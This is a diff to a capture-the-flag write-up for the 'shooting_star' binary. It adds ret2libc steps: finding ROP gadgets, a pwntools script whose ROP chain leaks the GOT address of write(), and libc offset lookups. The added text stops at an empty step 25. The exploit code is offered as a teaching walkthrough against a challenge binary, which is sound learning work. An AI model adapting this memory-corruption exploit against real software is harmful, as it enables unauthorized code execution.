@@ -81,7 +81,7 @@ Over a million stars above your head! Enjoy the silence and the glorious stars w
 15. We found the vuln there.
 16. I think the concept here is **ret2libc**, because there's not `system()` function, but only `reads()` and `write()`, both are come from the libc library.
 17. Now we need to leak the `.got` address.
-18. First, let's get the `pop_rdi` value from the binary using ropper.
+18. First, let's get the `pop_rdi` value from the binary using ropper. We need pop RDI gadget to pass `sh` to `system()`.
 
 ```
 ropper --file shooting_star --search "pop rdi"
@@ -92,7 +92,7 @@ ropper --file shooting_star --search "pop rdi"
 ![image](https://user-images.githubusercontent.com/70703371/209471808-e24d8024-2b4f-4d13-b242-36ba92a3b9bc.png)
 
 
-19. Next, get the `pop_rsi` value.
+19. Next, get the `pop_rsi` value. We need pop RSI to put **got.write** address in (before leak the `got` via **plt.write**.
 
 ```
 ropper --file shooting_star --search "pop rsi"
@@ -103,5 +103,102 @@ ropper --file shooting_star --search "pop rsi"
 ![image](https://user-images.githubusercontent.com/70703371/209471877-bd6dc023-ec2d-4e90-ae9b-ac03deb64a3f.png)
 
 
-20. 
+20. Now to leak the `got address` , the payloads we need to send are:
 
+```
+paddingBytes - pop_rsi_r15 - elf.got.write - 0x0 - elf.plt.write - elf.symbols.main
+
+NOTES:
+- pop_rsi_r15 -> pop the following value from stack into RSI.
+- elf.got.write -> address of write() in GOT.
+- 0x0 -> as a junk , cause we don't need anything in r15.
+- elf.plt.write -> need to call plt.write() to print address of got.write()
+- elf.symbols.main -> return to the beginning/start of the `star()` function.
+```
+
+21. Here are our script so far:
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.GDB:  
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  
+        return process([exe] + argv, *a, **kw)
+
+
+def find_ip(payload):
+    p = process(exe)
+    p.sendlineafter('>', '1')
+    p.sendlineafter('>>', payload)
+    p.wait() # wait for the process to crash
+
+    # Print out the address of EIP/RIP at the time of crashing
+    # ip_offset = cyclic_find(p.corefile.pc)  # x86
+    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
+    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
+    return ip_offset
+
+gdbscript = '''
+init-pwndbg
+break main
+'''.format(**locals())
+
+exe = './shooting_star'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'debug'
+
+## EXPLOITATION
+
+paddingBytes = find_ip(cyclic(1024))
+
+io = start()
+pop_rdi = 0x4012cb
+pop_rsi_r15 = 0x4012c9  
+
+payload = flat(
+    {paddingBytes: [
+        pop_rsi_r15,  # Pop the following value from stack into RSI
+        elf.got.write,  # Address of write() in GOT
+        0x0,  # Don't need anything in r15
+        elf.plt.write,  # Call plt.write() to print address of got.write()
+        elf.symbols.main  # Return to beginning of star function
+    ]}
+)
+
+# Send the payload
+io.sendlineafter('>', '1')
+io.sendlineafter('>>', payload)
+io.recvuntil('May your wish come true!\n') 
+leaked_addr = io.recv() # got the address printed out in hex
+got_write = unpack(leaked_addr[:6].ljust(8, b"\x00"))
+info("leaked got_write: %#x", got_write)
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/209503679-60d1b410-c2e5-45b2-98df-48952964318c.png)
+
+
+22. Great! We leaked the `got_write address`.
+23. Next we need to get our `libc base address`. Let's run ldd to the binary.
+
+> RESULT - /lib/x86_64-linux-gnu/libc.so.6
+
+![image](https://user-images.githubusercontent.com/70703371/209504262-21a0c4f2-1260-4c36-9c7a-986afc55f68d.png)
+
+
+24. Then run **readelf** to get the offset of write from the libc.
+
+> RESULT - f8180
+
+![image](https://user-images.githubusercontent.com/70703371/209504509-9dc79cdd-30a8-4fd4-bb06-9175bd423fd6.png)
+
+
+25. 
